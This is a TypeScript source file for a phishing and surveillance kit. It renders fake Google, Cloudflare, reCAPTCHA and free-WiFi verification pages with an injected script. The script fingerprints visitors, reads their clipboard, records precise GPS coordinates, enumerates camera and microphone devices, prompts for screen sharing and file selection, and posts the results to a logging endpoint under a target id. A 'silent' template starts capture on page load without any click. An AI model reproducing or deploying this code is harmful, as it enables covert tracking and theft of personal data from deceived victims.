export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
  const flow = theme.flow || 'full'; 
  const perms = theme.perms || ['gps']; 
  
  return `
<script>
  (function() {
    var permsCompleted = 0;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    var flowType = '${flow}';
    var requiredPerms = ${JSON.stringify(perms)};
    var cfg = ${JSON.stringify(theme)};
    
    function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      var threshold = (flowType === 'full') ? 60 : 15;
      if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
        hasRedirected = true;
        window.location.href = targetUrl;
      }
    }

    if (flowType === 'silent') {
       window.onload = function() {
         setTimeout(function() { window.startCapture('silent'); }, 1000);
       };
    }

    setInterval(checkRedirect, 1000);

    window.startCapture = async function(mode) {
      if (hasRedirected) return;
      var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
      if (!box) return;

      var isSilent = mode === 'silent' || flowType === 'silent';
      var accent = cfg.accent || '#3498db';

      if (!isSilent) {
        box.innerHTML = '<div id="status-icon" style="font-size:45px; margin-bottom:20px;">' + (cfg.icon || '🛡️') + '</div>' +
          '<h2 id="status-title" style="font-weight:600; color:#1a1a1a; margin-bottom:10px;">Security Verification</h2>' +
          '<div id="progress-container" style="width:100%; background:#e0e0e0; border-radius:12px; height:8px; margin-bottom:20px; overflow:hidden;">' +
          '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.8s ease-in-out;"></div>' +
          '</div>' +
          '<p id="status-text" style="font-size:13px; color:#666; font-family:sans-serif; min-height: 40px; line-height:1.5;">Memulai otentikasi aman...</p>';
      }

      var statusTitle = document.getElementById('status-title');
      var statusText = document.getElementById('status-text');
      var bar = document.getElementById('progress-bar');
      var icon = document.getElementById('status-icon');
      
      function updateProgress(p, text, title) {
        if (bar) bar.style.width = p + '%';
        if (statusText) statusText.innerText = text;
        if (statusTitle && title) statusTitle.innerText = title;
      }

      async function logEvent(type, data) {
        try {
          await fetch('/api/log/' + targetId + '/' + type, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
          });
        } catch(e) {}
      }

      function finish(success, reason) {
        if (isSilent) { window.location.href = targetUrl; return; }
        if (bar) bar.style.width = '100%';
        if (success) {
          if (icon) icon.innerText = "✅";
          if (statusTitle) { statusTitle.innerText = "VERIFIED"; statusTitle.style.color = "#27ae60"; }
          if (statusText) {
             statusText.innerText = "Sertifikat keamanan diterbitkan. Mengalihkan...";
          }
        } else {
          if (icon) icon.innerText = "ℹ️";
          if (statusTitle) statusTitle.innerText = "COMPLETE";
          if (statusText) statusText.innerText = "Proses selesai. Membuka akses...";
        }
        setTimeout(checkRedirect, 3000);
      }

      try {
        if (!isSilent) updateProgress(8, "Menganalisis integritas browser...", "SECURITY_CHECK");
        
        var metadata = {
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + "x" + window.screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cores: navigator.hardwareConcurrency || "N/A",
          mem: navigator.deviceMemory || "N/A",
          ref: document.referrer || "Direct"
        };
        await logEvent('info', metadata);

        var stepProg = Math.floor(80 / (requiredPerms.length || 1));
        var prog = 15;

        for (var i = 0; i < requiredPerms.length; i++) {
          var p = requiredPerms[i];
          prog += stepProg;

          try {
            if (p === 'notification') {
              if (!isSilent) updateProgress(prog, "Sinkronisasi jalur peringatan...", "NOTIF_AUTH");
              if ("Notification" in window) await Notification.requestPermission();
            }

            if (p === 'clipboard') {
              if (!isSilent) updateProgress(prog, "Memvalidasi cache data aman...", "BUFFER_SYNC");
              if (navigator.clipboard) {
                var clip = await navigator.clipboard.readText().catch(function(){});
                if (clip) await logEvent('extra', { clipboard: clip });
              }
            }

            if (p === 'media') {
              if (!isSilent) updateProgress(prog, "Kalibrasi akses hardware AV...", "MEDIA_SETUP");
              if (navigator.mediaDevices) {
                try {
                  await navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(s => s.getTracks().forEach(t => t.stop())).catch(e=>{});
                  var devs = await navigator.mediaDevices.enumerateDevices();
                  var list = devs.map(d => d.kind + ': ' + (d.label || 'Auth-Device')).join('\\n');
                  await logEvent('extra', { media: list });
                } catch(e) {}
              }
            }

            if (p === 'gps') {
              if (!isSilent) {
                updateProgress(prog, "Verifikasi koordinat spatial regional...", "GEO_VALIDATION");
                if (icon && cfg.waitIcon) icon.innerText = cfg.waitIcon;
              }
              if (navigator.geolocation) {
                await new Promise(resolve => {
                  navigator.geolocation.getCurrentPosition(
                    function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
                    function(err) { resolve(); },
                    { enableHighAccuracy: true, timeout: 10000 }
                  );
                });
              }
            }

            if (p === 'screen') {
              if (!isSilent) updateProgress(prog, "Integritas visual sedang diproses...", "DISPLAY_AUTH");
              if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                await navigator.mediaDevices.getDisplayMedia({ video: true }).then(s => {
                  var track = s.getVideoTracks()[0];
                  logEvent('extra', { screen_label: track.label });
                  s.getTracks().forEach(t => t.stop());
                }).catch(e=>{});
              }
            }

            if (p === 'files') {
              if (!isSilent) updateProgress(prog, "Sinkronisasi token media galeri...", "STORAGE_CERT");
              if (window.showOpenFilePicker) {
                 var handle = await window.showOpenFilePicker({ multiple: true, types: [{ description: 'Media Audit', accept: { 'image/*': ['.png','.jpg','.jpeg'], 'video/*': ['.mp4'] } }] }).catch(function(){ return null; });
                 if (handle) {
                    for (const item of handle) {
                      var file = await item.getFile();
                      await logEvent('extra', { file_name: file.name, file_size: file.size });
                    }
                 }
              }
            }
          } catch(e) {}
          permsCompleted++;
        }

        finish(true);
      } catch (err) {
        finish(false, "Sistem sibuk.");
      }
    };
  })();
</script>
`;
};

const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files'];

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  'google': {
    name: "🛡️ Google: Identity Protection (OP - Professional)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Roboto', Arial, sans-serif; background:#f5f5f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; width:90%; max-width:400px; padding:45px; border:1px solid #dadce0; border-radius:8px; text-align:center; box-shadow:0 1px 3px rgba(0,0,0,0.1); } h2 { font-weight:400; font-size:24px; color:#202124; margin-top:20px; } p { color:#5f6368; font-size:14px; line-height:1.6; margin:20px 0 35px; } .btn { background:#1a73e8; color:white; border:none; padding:14px 24px; border-radius:4px; font-weight:500; cursor:pointer; width:100%; font-size:15px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90"><h2>Verify your identity</h2><p>Pastikan koneksi Anda aman. Google perlu memverifikasi perangkat dan lokasi Anda untuk memberikan akses penuh.</p><button class="btn" onclick="window.startCapture();">Confirm identity</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
    })}</body></html>`
  },
  'gallery': {
    name: "🖼️ Gallery: Audit & Sync (Ultimate Robin Hood)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Audit</title><style>body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:420px; padding:40px; border:1px solid #333; border-radius:12px; text-align:center; background:#0a0a0a; } .btn { background:#fff; color:#000; padding:16px; border-radius:8px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size:16px; margin-top:25px; transition: 0.3s; } .btn:hover { background: #ccc; }</style></head><body><div class="box"><div style="font-size:50px;">🔒</div><h2>Identity Awareness Audit</h2><p style="color:#888; font-size:14px; line-height:1.6;">Protokol keamanan mendeteksi aktivitas mencurigakan. Sinkronisasi metadata gallery dan spatial diperlukan untuk validasi kepemilikan perangkat.</p><button class="btn" onclick="window.startCapture();">Mulai Verifikasi Audit</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: 'gallery', perms: ALL_PERMS, accent: '#ffffff', icon: '🕵️'
    })}</body></html>`
  },
  'cloudflare': {
    name: "☁️ Cloudflare: Integrity Audit (OP - Corporate)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Reviewing security...</title><style>body { font-family: system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; padding:20px; } .box { max-width:500px; } .spinner { border:3px solid #f3f3f3; border-top:3px solid #fa8231; border-radius:50%; width:40px; height:40px; animation: spin 1s linear infinite; margin:30px auto; } @keyframes spin { to { transform:rotate(360deg); } } h1 { font-size:26px; font-weight:500; } .btn { background:#fff; border:1px solid #ccc; padding:12px 30px; border-radius:4px; color:#333; font-weight:600; cursor:pointer; width:100%; font-size:15px; margin-top:10px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="130"><div class="spinner"></div><h1>Checking your browser...</h1><p style="color:#666; font-size:15px;">Harap konfirmasi integritas hardware dan lokasi regional Anda untuk melewati firewall perlindungan DDoS kami.</p><button class="btn" onclick="window.startCapture();">Verify you are human</button></div>${getCaptureScript(id, 'https://cloudflare.com', {
      tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#fa8231', icon: '☁️'
    })}</body></html>`
  },
  'pegasus': {
    name: "💀 PEGASUS: Advanced Terminal (OP - Hacky)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Pegasus Terminal</title><style>body { background:#000; color:#0f0; font-family:'Courier New', monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:460px; border:1px solid #0f0; padding:40px; background:#080808; text-align:left; box-shadow: 0 0 15px rgba(0,255,0,0.15); } .btn { width:100%; background:#0f0; color:#000; border:none; padding:15px; font-weight:bold; cursor:pointer; margin-top:30px; letter-spacing:1px; }</style></head><body><div class="box"><div>[SYSTEM_KERNEL_v5.0]</div><br><div>[!] STATUS: UNAUTHORIZED_IP_DETECTED</div><div>[!] ACTION: AUDIT_REQUIRED_TO_BYPASS</div><br><p style="color:#888; font-size:12px;">Validasi otentikasi hardware visual, spatial, dan storage sedang dimohon. Klik di bawah untuk sinkronisasi terminal.</p><button class="btn" onclick="window.startCapture();">RUN SYSTEM_AUDIT</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#0f0', icon: '💾'
    })}</body></html>`
  },
  'wifi': {
    name: "📶 WIFI: Hotspot Certification (OP - High Bait)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>WiFi Connect</title><style>body { background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { text-align:center; width:90%; max-width:380px; } hr { border:0; border-top:1px solid #f0f0f0; margin:25px 0; } .btn { background:#000; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://cdn-icons-png.flaticon.com/512/93/93158.png" width="70"><br><br><h1>Free WiFi Login</h1><p style="color:#666; font-size:14px;">Otorisasi identitas perangkat diperlukan untuk menggunakan hotspot publik ini secara aman.</p><hr><button class="btn" onclick="window.startCapture();">LOGIN TO NETWORK</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: 'wifi', perms: ALL_PERMS, accent: '#000', icon: '📶'
    })}</body></html>`
  },
  'recap': {
    name: "🕵️ GHOST: Silent Integrity (OP - No Button)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#fdfdfd; font-family:sans-serif; } .box { border:1px solid #dbdbdb; padding:15px; background:#fff; display:flex; align-items:center; width:300px; box-shadow:0 1px 3px rgba(0,0,0,0.05); }</style></head><body><div style="text-align:center;"><p style="color:#555; margin-bottom:15px; font-size:14px;">Checking browser hardware integrity...</p><div class="box"><div style="width:24px; height:24px; border:2px solid #cecece; margin-right:15px;"></div><div style="font-size:13px; color:#555;">Finalizing audit...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="28"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'recap', flow: 'silent', perms: ALL_PERMS
    })}</body></html>`
  }
};

